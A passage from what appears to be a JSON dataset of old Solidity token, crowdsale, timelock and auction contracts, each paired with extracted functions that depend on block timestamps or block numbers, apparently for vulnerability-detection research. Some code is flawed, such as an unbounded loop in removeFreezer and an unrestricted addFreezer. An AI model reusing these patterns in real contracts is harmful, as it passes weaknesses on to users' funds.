ico[uint(IcoPhases.FullCrowdsale)] = Phase(1539594000, 1542275999, 1000000000000000, 2);\n }\n function mintReservedTokens() onlyOwner public {\n uint256 reserved_tokens = FOUNDERS_SHARE.add(RESERVE_FUND).add(CONTENT_FUND).add(BOUNTY_FUND);\n require(MintableToken(token).mint(wallet, reserved_tokens));\n }\n function airdrop(address[] _to, uint256[] _value) onlyOwner public returns (bool) {\n require(!isFinalized);\n require(_to.length == _value.length);\n require(_to.length <= 100);\n for(uint8 i = 0; i < _to.length; i++) {\n require(MintableToken(token).mint(_to[i], (_value[i].mul((10 ** uint256(18))))) == true);\n }\n return true;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n uint256 minimum = _currentIcoPhaseMinimum();\n require(_weiAmount >= minimum);\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n uint256 tokens = _weiAmount.mul(rate);\n uint bonus = _currentIcoPhaseBonus();\n return tokens.add((tokens.mul(bonus)).div(100));\n }\n function finalization() internal {\n uint256 _tokenAmount = HARD_CAP.sub(token.totalSupply());\n require(MintableToken(token).mint(wallet, _tokenAmount));\n super.finalization();\n }\n function _currentIcoPhaseBonus() public view returns (uint8) {\n for (uint i = 0; i < 5; i++) {\n if(ico[i].startTime <= now && ico[i].endTime >= now){\n return ico[i].bonus;\n }\n }\n return 0;\n }\n function _currentIcoPhaseMinimum() public view returns (uint256) {\n for (uint i = 0; i < 5; i++) {\n if(ico[i].startTime <= now && ico[i].endTime >= now){\n return ico[i].minimum;\n }\n }\n return 0;\n }\n}",
  "extract_feature": [
    "function TimedCrowdsale(uint256 _openingTime, uint256 _closingTime) public {\nrequire(_openingTime >= block.timestamp);\nrequire(_closingTime >= _openingTime);\nopeningTime = _openingTime;\nclosingTime = _closingTime;\n}",
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f0d"
  },
  "filename": "6322.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\ncontract TokenTimelock {\n using SafeERC20 for ERC20Basic;\n ERC20Basic public token;\n address public beneficiary;\n uint256 public releaseTime;\n constructor(\n ERC20Basic _token,\n address _beneficiary,\n uint256 _releaseTime\n )\n public\n {\n require(_releaseTime > block.timestamp);\n token = _token;\n beneficiary = _beneficiary;\n releaseTime = _releaseTime;\n }\n function release() public {\n require(block.timestamp >= releaseTime);\n uint256 amount = token.balanceOf(this);\n require(amount > 0);\n token.safeTransfer(beneficiary, amount);\n }\n}\ncontract TstTokenTimelock is Ownable, TokenTimelock {\n constructor(\n ERC20Basic _token,\n address _beneficiary,\n uint256 _releaseTime\n )\n public\n TokenTimelock(_token, _beneficiary, _releaseTime)\n {}\n function() public payable {\n }\n function withdrawEth(uint256 _value) public onlyOwner {\n owner.transfer(_value);\n }\n function transferAnyERC20Token(address _token_address, uint _amount) public onlyOwner returns (bool success) {\n require(_token_address != address(token));\n return ERC20Basic(_token_address).transfer(owner, _amount);\n }\n}",
  "extract_feature": [
    "function release() public {\nrequire(block.timestamp >= releaseTime);\nuint256 amount = token.balanceOf(this);\nrequire(amount > 0);\ntoken.safeTransfer(beneficiary, amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f0e"
  },
  "filename": "6348.sol",
  "content": "pragma solidity ^0.4.18;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract PausableToken is StandardToken, Pausable {\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract LetsbetToken is PausableToken, BurnableToken {\n string public constant name = \"Letsbet Token\";\n string public constant symbol = \"XBET\";\n uint8 public constant decimals = 18;\n uint256 public constant INITIAL_SUPPLY = 100000000 * 10**uint256(decimals);\n uint256 public constant TEAM_TOKENS = 18000000 * 10**uint256(decimals);\n uint256 public constant BOUNTY_TOKENS = 5000000 * 10**uint256(decimals);\n uint256 public constant AUCTION_TOKENS = 77000000 * 10**uint256(decimals);\n event Deployed(uint indexed _totalSupply);\n function LetsbetToken(\n address auctionAddress,\n address walletAddress,\n address bountyAddress)\n public\n {\n require(auctionAddress != 0x0);\n require(walletAddress != 0x0);\n require(bountyAddress != 0x0);\n totalSupply_ = INITIAL_SUPPLY;\n balances[auctionAddress] = AUCTION_TOKENS;\n balances[walletAddress] = TEAM_TOKENS;\n balances[bountyAddress] = BOUNTY_TOKENS;\n Transfer(0x0, auctionAddress, balances[auctionAddress]);\n Transfer(0x0, walletAddress, balances[walletAddress]);\n Transfer(0x0, bountyAddress, balances[bountyAddress]);\n Deployed(totalSupply_);\n assert(totalSupply_ == balances[auctionAddress] + balances[walletAddress] + balances[bountyAddress]);\n }\n}\ncontract DutchAuction {\n uint constant public TOKEN_CLAIM_WAITING_PERIOD = 7 days;\n LetsbetToken public token;\n address public ownerAddress;\n address public walletAddress;\n uint public startPrice;\n uint public priceDecreaseRate;\n uint public startTime;\n uint public endTimeOfBids;\n uint public finalizedTime;\n uint public startBlock;\n uint public receivedWei;\n uint public fundsClaimed;\n uint public tokenMultiplier;\n uint public tokensAuctioned;\n uint public finalPrice;\n mapping (address => uint) public bids;\n Stages public stage;\n enum Stages {\n AuctionDeployed,\n AuctionSetUp,\n AuctionStarted,\n AuctionEnded,\n TokensDistributed\n }\n modifier atStage(Stages _stage) {\n require(stage == _stage);\n _;\n }\n modifier isOwner() {\n require(msg.sender == ownerAddress);\n _;\n }\n event Deployed(\n uint indexed _startPrice,\n uint indexed _priceDecreaseRate\n );\n event Setup();\n event AuctionStarted(uint indexed _startTime, uint indexed _blockNumber);\n event BidSubmission(\n address indexed sender,\n uint amount,\n uint missingFunds,\n uint timestamp\n );\n event ClaimedTokens(address indexed _recipient, uint _sentAmount);\n event AuctionEnded(uint _finalPrice);\n event TokensDistributed();\n function DutchAuction(\n address _walletAddress,\n uint _startPrice,\n uint _priceDecreaseRate,\n uint _endTimeOfBids)\n public\n {\n require(_walletAddress != 0x0);\n walletAddress = _walletAddress;\n ownerAddress = msg.sender;\n stage = Stages.AuctionDeployed;\n changeSettings(_startPrice, _priceDecreaseRate,_endTimeOfBids);\n Deployed(_startPrice, _priceDecreaseRate);\n }\n function () public payable atStage(Stages.AuctionStarted) {\n bid();\n }\n function setup(address _tokenAddress) public isOwner atStage(Stages.AuctionDeployed) {\n require(_tokenAddress != 0x0);\n token = LetsbetToken(_tokenAddress);\n tokensAuctioned = token.balanceOf(address(this));\n tokenMultiplier = 10 ** uint(token.decimals());\n stage = Stages.AuctionSetUp;\n Setup();\n }\n function changeSettings(\n uint _startPrice,\n uint _priceDecreaseRate,\n uint _endTimeOfBids\n )\n internal\n {\n require(stage == Stages.AuctionDeployed || stage == Stages.AuctionSetUp);\n require(_startPrice > 0);\n require(_priceDecreaseRate > 0);\n require(_endTimeOfBids > now);\n endTimeOfBids = _endTimeOfBids;\n startPrice = _startPrice;\n priceDecreaseRate = _priceDecreaseRate;\n }\n function startAuction() public isOwner atStage(Stages.AuctionSetUp) {\n stage = Stages.AuctionStarted;\n startTime = now;\n startBlock = block.number;\n AuctionStarted(startTime, startBlock);\n }\n function finalizeAuction() public isOwner atStage(Stages.AuctionStarted) {\n uint missingFunds = missingFundsToEndAuction();\n require(missingFunds == 0 || now > endTimeOfBids);\n finalPrice = tokenMultiplier * receivedWei / tokensAuctioned;\n finalizedTime = now;\n stage = Stages.AuctionEnded;\n AuctionEnded(finalPrice);\n assert(finalPrice > 0);\n }\n function bid()\n public\n payable\n atStage(Stages.AuctionStarted)\n {\n require(msg.value > 0);\n assert(bids[msg.sender] + msg.value >= msg.value);\n uint missingFunds = missingFundsToEndAuction();\n require(msg.value <= missingFunds);\n bids[msg.sender] += msg.value;\n receivedWei += msg.value;\n walletAddress.transfer(msg.value);\n BidSubmission(msg.sender, msg.value, missingFunds,block.timestamp);\n assert(receivedWei >= msg.value);\n }\n function claimTokens() public atStage(Stages.AuctionEnded) returns (bool) {\n return proxyClaimTokens(msg.sender);\n }\n function proxyClaimTokens(address receiverAddress)\n public\n atStage(Stages.AuctionEnded)\n returns (bool)\n {\n require(now > finalizedTime + TOKEN_CLAIM_WAITING_PERIOD);\n require(receiverAddress != 0x0);\n if (bids[receiverAddress] == 0) {\n return false;\n }\n uint num = (tokenMultiplier * bids[receiverAddress]) / finalPrice;\n uint auctionTokensBalance = token.balanceOf(address(this));\n if (num > auctionTokensBalance) {\n num = auctionTokensBalance;\n }\n fundsClaimed += bids[receiverAddress];\n bids[receiverAddress] = 0;\n require(token.transfer(receiverAddress, num));\n ClaimedTokens(receiverAddress, num);\n if (fundsClaimed == receivedWei) {\n stage = Stages.TokensDistributed;\n TokensDistributed();\n }\n assert(token.balanceOf(receiverAddress) >= num);\n assert(bids[receiverAddress] == 0);\n return true;\n }\n function price() public constant returns (uint) {\n if (stage == Stages.AuctionEnded ||\n stage == Stages.TokensDistributed) {\n return finalPrice;\n }\n return calcTokenPrice();\n }\n function missingFundsToEndAuction() constant public returns (uint) {\n uint requiredWei = tokensAuctioned * price() / tokenMultiplier;\n if (requiredWei <= receivedWei) {\n return 0;\n }\n return requiredWei - receivedWei;\n }\n function calcTokenPrice() constant private returns (uint) {\n uint currentPrice;\n if (stage == Stages.AuctionStarted) {\n currentPrice = startPrice - priceDecreaseRate * (block.number - startBlock);\n }else {\n currentPrice = startPrice;\n }\n return currentPrice;\n }\n}",
  "extract_feature": [
    "function startAuction() public isOwner atStage(Stages.AuctionSetUp) {\nstage = Stages.AuctionStarted;\nstartTime = now;\nstartBlock = block.number;\nAuctionStarted(startTime, startBlock);\n}",
    "function calcTokenPrice() constant private returns (uint) {\nuint currentPrice;\nif (stage == Stages.AuctionStarted) {\ncurrentPrice = startPrice - priceDecreaseRate * (block.number - startBlock);\n}else {\ncurrentPrice = startPrice;\n}\nreturn currentPrice;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f0f"
  },
  "filename": "6369.sol",
  "content": "pragma solidity 0.4.23;\ncontract DSAuthority {\n function canCall(\n address src, address dst, bytes4 sig\n ) public view returns (bool);\n}\ncontract DSAuthEvents {\n event LogSetAuthority (address indexed authority);\n event LogSetOwner (address indexed owner);\n}\ncontract DSAuth is DSAuthEvents {\n DSAuthority public authority;\n address public owner;\n constructor() public {\n owner = msg.sender;\n emit LogSetOwner(msg.sender);\n }\n function setOwner(address owner_)\n public\n auth\n {\n owner = owner_;\n emit LogSetOwner(owner);\n }\n function setAuthority(DSAuthority authority_)\n public\n auth\n {\n authority = authority_;\n emit LogSetAuthority(authority);\n }\n modifier auth {\n require(isAuthorized(msg.sender, msg.sig));\n _;\n }\n function isAuthorized(address src, bytes4 sig) internal view returns (bool) {\n if (src == address(this)) {\n return true;\n } else if (src == owner) {\n return true;\n } else if (authority == DSAuthority(0)) {\n return false;\n } else {\n return authority.canCall(src, this, sig);\n }\n }\n}\ncontract DSNote {\n event LogNote(\n bytes4 indexed sig,\n address indexed guy,\n bytes32 indexed foo,\n bytes32 indexed bar,\n uint wad,\n bytes fax\n ) anonymous;\n modifier note {\n bytes32 foo;\n bytes32 bar;\n assembly {\n foo := calldataload(4)\n bar := calldataload(36)\n }\n emit LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);\n _;\n }\n}\ncontract DSStop is DSNote, DSAuth {\n bool public stopped;\n modifier stoppable {\n require(!stopped);\n _;\n }\n function stop() public auth note {\n stopped = true;\n }\n function start() public auth note {\n stopped = false;\n }\n}\ncontract DSMath {\n function add(uint x, uint y) internal pure returns (uint z) {\n require((z = x + y) >= x);\n }\n function sub(uint x, uint y) internal pure returns (uint z) {\n require((z = x - y) <= x);\n }\n function mul(uint x, uint y) internal pure returns (uint z) {\n require(y == 0 || (z = x * y) / y == x);\n }\n}\ncontract ERC20 {\n function totalSupply() constant public returns (uint256 supply);\n function balanceOf(address _owner) constant public returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract Coin is ERC20, DSStop {\n string public name;\n string public symbol;\n uint8 public decimals = 18;\n uint256 internal c_totalSupply;\n mapping(address => uint256) internal c_balances;\n mapping(address => mapping(address => uint256)) internal c_approvals;\n function init(uint256 token_supply, string token_name, string token_symbol) internal {\n c_balances[msg.sender] = token_supply;\n c_totalSupply = token_supply;\n name = token_name;\n symbol = token_symbol;\n }\n function() public {\n assert(false);\n }\n function setName(string _name) auth public {\n name = _name;\n }\n function totalSupply() constant public returns (uint256) {\n return c_totalSupply;\n }\n function balanceOf(address _owner) constant public returns (uint256) {\n return c_balances[_owner];\n }\n function approve(address _spender, uint256 _value) public stoppable returns (bool) {\n require(msg.data.length >= (2 * 32) + 4);\n require(_value == 0 || c_approvals[msg.sender][_spender] == 0);\n require(_value < c_totalSupply);\n c_approvals[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant public returns (uint256) {\n return c_approvals[_owner][_spender];\n }\n}\ncontract FreezerAuthority is DSAuthority {\n address[] internal c_freezers;\n bytes4 constant setFreezingSig = bytes4(0x51c3b8a6);\n bytes4 constant transferAndFreezingSig = bytes4(0xb8a1fdb6);\n function canCall(address caller, address, bytes4 sig) public view returns (bool) {\n if (isFreezer(caller) && (sig == setFreezingSig || sig == transferAndFreezingSig)) {\n return true;\n } else {\n return false;\n }\n }\n function addFreezer(address freezer) public {\n int i = indexOf(c_freezers, freezer);\n if (i < 0) {\n c_freezers.push(freezer);\n }\n }\n function removeFreezer(address freezer) public {\n int index = indexOf(c_freezers, freezer);\n if (index >= 0) {\n uint i = uint(index);\n while (i < c_freezers.length - 1) {\n c_freezers[i] = c_freezers[i + 1];\n }\n c_freezers.length--;\n }\n }\n function indexOf(address[] values, address value) internal pure returns (int) {\n uint i = 0;\n while (i < values.length) {\n if (values[i] == value) {\n return int(i);\n }\n i++;\n }\n return int(- 1);\n }\n function isFreezer(address addr) public constant returns (bool) {\n return indexOf(c_freezers, addr) >= 0;\n }\n}\ncontract LemoCoin is Coin, DSMath {\n struct FreezingNode {\n uint end_stamp;\n uint num_lemos;\n uint8 freezing_type;\n }\n mapping(address => FreezingNode[]) internal c_freezing_list;\n constructor(uint256 token_supply, string token_name, string token_symbol) public {\n init(token_supply, token_name, token_symbol);\n setAuthority(new FreezerAuthority());\n }\n function addFreezer(address freezer) auth public {\n FreezerAuthority(authority).addFreezer(freezer);\n }\n function removeFreezer(address freezer) auth public {\n FreezerAuthority(authority).removeFreezer(freezer);\n }\n event ClearExpiredFreezingEvent(address indexed addr);\n event SetFreezingEvent(address indexed addr, uint end_stamp, uint num_lemos, uint8 indexed freezing_type);\n function clearExpiredFreezing(address addr) public {\n FreezingNode[] storage nodes = c_freezing_list[addr];\n uint length = nodes.length;\n uint left = 0;\n while (left < length) {\n if (nodes[left].end_stamp <= block.timestamp) {\n break;\n }\n left++;\n }\n uint right = left + 1;\n while (left < length && right < length) {\n if (nodes[right].end_stamp > block.timestamp) {\n nodes[left] = nodes[right];\n left++;\n }\n right++;\n }\n if (length != left) {\n nodes.length = left;\n emit ClearExpiredFreezingEvent(addr);\n }\n }\n function validBalanceOf(address addr) constant public returns (uint) {\n FreezingNode[] memory nodes = c_freezing_list[addr];\n uint length = nodes.length;\n uint total_lemos = balanceOf(addr);\n for (uint i = 0; i < length; ++i) {\n if (nodes[i].end_stamp > block.timestamp) {\n total_lemos = sub(total_lemos, nodes[i].num_lemos);\n }\n }\n return total_lemos;\n }\n function freezingBalanceNumberOf(address addr) constant public returns (uint) {\n return c_freezing_list[addr].length;\n }\n function freezingBalanceInfoOf(address addr, uint index) constant public returns (uint, uint, uint8) {\n return (c_freezing_list[addr][index].end_stamp, c_freezing_list[addr][index].num_lemos, uint8(c_freezing_list[addr][index].freezing_type));\n }\n function setFreezing(address addr, uint end_stamp, uint num_lemos, uint8 freezing_type) auth stoppable public {\n require(block.timestamp < end_stamp);\n require(num_lemos < c_totalSupply);\n clearExpiredFreezing(addr);\n uint valid_balance = validBalanceOf(addr);\n require(valid_balance >= num_lemos);\n FreezingNode memory node = FreezingNode(end_stamp, num_lemos, freezing_type);\n c_freezing_list[addr].push(node);\n emit SetFreezingEvent(addr, end_stamp, num_lemos, freezing_type);\n }\n function transferAndFreezing(address _to, uint256 _value, uint256 freeze_amount, uint end_stamp, uint8 freezing_type) auth stoppable public returns (bool) {\n require(_value < c_totalSupply);\n require(freeze_amount <= _value);\n transfer(_to, _value);\n setFreezing(_to, end_stamp, freeze_amount, freezing_type);\n return true;\n }\n function transfer(address _to, uint256 _value) stoppable public returns (bool) {\n require(msg.data.length >= (2 * 32) + 4);\n require(_value < c_totalSupply);\n clearExpiredFreezing(msg.sender);\n uint from_lemos = validBalanceOf(msg.sender);\n require(from_lemos >= _value);\n c_balances[msg.sender] = sub(c_balances[msg.sender], _value);\n c_balances[_to] = add(c_balances[_to], _value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) stoppable public returns (bool) {\n require(_value < c_totalSupply);\n require(c_approvals[_from][msg.sender] >= _value);\n clearExpiredFreezing(_from);\n uint from_lemos = validBalanceOf(_from);\n require(from_lemos >= _value);\n c_approvals[_from][msg.sender] = sub(c_approvals[_from][msg.sender], _value);\n c_balances[_from] = sub(c_balances[_from], _value);\n c_balances[_to] = add(c_balances[_to], _value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n}",
  "extract_feature": [
    "function clearExpiredFreezing(address addr) public {\nFreezingNode[] storage nodes = c_freezing_list[addr];\nuint length = nodes.length;\nuint left = 0;\nwhile (left < length) {\nif (nodes[left].end_stamp <= block.timestamp) {\nbreak;\n}\nleft++;\n}\nuint right = left + 1;\nwhile (left < length && right < length) {\nif (nodes[right].end_stamp > block.timestamp) {\nnodes[left] = nodes[right];\nleft++;\n}\nright++;\n}\nif (length != left) {\nnodes.length = left;\nemit ClearExpiredFreezingEvent(addr);\n}\n}",
    "function validBalanceOf(address addr) constant public returns (uint) {\nFreezingNode[] memory nodes = c_freezing_list[addr];\nuint length = nodes.length;\nuint total_lemos = balanceOf(addr);\nfor (uint i = 0; i < length; ++i) {\nif (nodes[i].end_stamp > block.timestamp) {\ntotal_lemos = sub(total_lemos, nodes[i].num_lemos);\n}\n}\nreturn total_lemos;\n}",
    "function setFreezing(address addr, uint end_stamp, uint num_lemos, uint8 freezing_type) auth stoppable public {\nrequire(block.timestamp < end_stamp);\nrequire(num_lemos < c_totalSupply);\nclearExpiredFreezing(addr);\nuint valid_balance = validBalanceOf(addr);\nrequire(valid_balance >= num_lemos);\nFreezingNode memory node = FreezingNode(end_stamp, num_lemos, freezing_type);\nc_freezing_list[addr].push(node);\nemit SetFreezingEvent(addr, end_stamp, num_lemos, freezing_type);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f10"
  },
  "filename": "6370.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Ownable {\n address public owner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract AMTTimelockedToken is Ownable {\n using SafeERC20 for ERC20Basic;\n using SafeMath for uint256;\n uint8 public constant decimals = 18;\n ERC20Basic token;\n uint256 public constant MANAGE_CAP = 1 * (10 ** 8) * (10 ** uint256(decimals));\n uint256 public constant DEVELOP_CAP = 2 * (10 ** 8) * (10 ** uint256(decimals));\n uint256 public constant MARKET_CAP = 1 * (10 ** 8) * (10 ** uint256(decimals));\n uint256 public constant FINANCE_CAP = 6 * (10 ** 7) * (10 ** uint256(decimals));\n uint256 public constant MANAGE_CAP_PER_ROUND = 2 * (10 ** 7) * (10 ** uint256(decimals));\n uint256 public constant DEVELOP_CAP_PER_ROUND = 4 * (10 ** 7) * (10 ** uint256(decimals));\n uint256 public constant MARKET_CAP_PER_ROUND = 2 * (10 ** 7) * (10 ** uint256(decimals));\n uint256 public constant FINANCE_CAP_PER_ROUND = 12 * (10 ** 6) * (10 ** uint256(decimals));\n mapping (address => uint256) releasedTokens;\n address beneficiary_manage;\n address beneficiary_develop;\n address beneficiary_market;\n address beneficiary_finance;\n uint256 first_round_release_time;\n uint256 second_round_release_time;\n uint256 third_round_release_time;\n uint256 forth_round_release_time;\n uint256 fifth_round_release_time;\n constructor(\n ERC20Basic _token,\n address _beneficiary_manage,\n address _beneficiary_develop,\n address _beneficiary_market,\n address _beneficiary_finance,\n uint256 _first_round_release_time,\n uint256 _second_round_release_time,\n uint256 _third_round_release_time,\n uint256 _forth_round_release_time,\n uint256 _fifth_round_release_time\n ) public {\n token = _token;\n beneficiary_manage = _beneficiary_manage;\n beneficiary_develop = _beneficiary_develop;\n beneficiary_market = _beneficiary_market;\n beneficiary_finance = _beneficiary_finance;\n first_round_release_time = _first_round_release_time;\n second_round_release_time = _second_round_release_time;\n third_round_release_time = _third_round_release_time;\n forth_round_release_time = _forth_round_release_time;\n fifth_round_release_time = _fifth_round_release_time;\n }\n function getToken() public view returns (ERC20Basic) {\n return token;\n }\n function getBeneficiaryManage() public view returns (address) {\n return beneficiary_manage;\n }\n function getBeneficiaryDevelop() public view returns (address) {\n return beneficiary_develop;\n }\n function getBeneficiaryMarket() public view returns (address) {\n return beneficiary_market;\n }\n function getBeneficiaryFinance() public view returns (address) {\n return beneficiary_finance;\n }\n function getFirstRoundReleaseTime() public view returns (uint256) {\n return first_round_release_time;\n }\n function getSecondRoundReleaseTime() public view returns (uint256) {\n return second_round_release_time;\n }\n function getThirdRoundReleaseTime() public view returns (uint256) {\n return third_round_release_time;\n }\n function getForthRoundReleaseTime() public view returns (uint256) {\n return forth_round_release_time;\n }\n function getFifthRoundReleaseTime() public view returns (uint256) {\n return fifth_round_release_time;\n }\n function releasedTokenOf(address _owner) public view returns (uint256) {\n return releasedTokens[_owner];\n }\n function validateReleasedToken(uint256 _round) internal onlyOwner {\n uint256 releasedTokenOfManage = 